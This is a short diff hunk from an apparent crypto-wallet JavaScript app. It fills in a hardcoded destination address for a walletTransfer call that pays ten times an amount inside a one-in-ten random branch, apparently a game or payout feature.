@@ -71,7 +71,7 @@ if (getRandomInt(10) === 1) {
 
                 console.log(amount)
         
-                let txt = await w.ever.walletTransfer('0:', amount*10, payload, false)
+                let txt = await w.ever.walletTransfer('0:46f3ec5e4a5194ccd328c16cf8347c9b70ee58aeda46c574382763a5b5c23d0c', amount*10, payload, false)
                 return txt;
             }
     
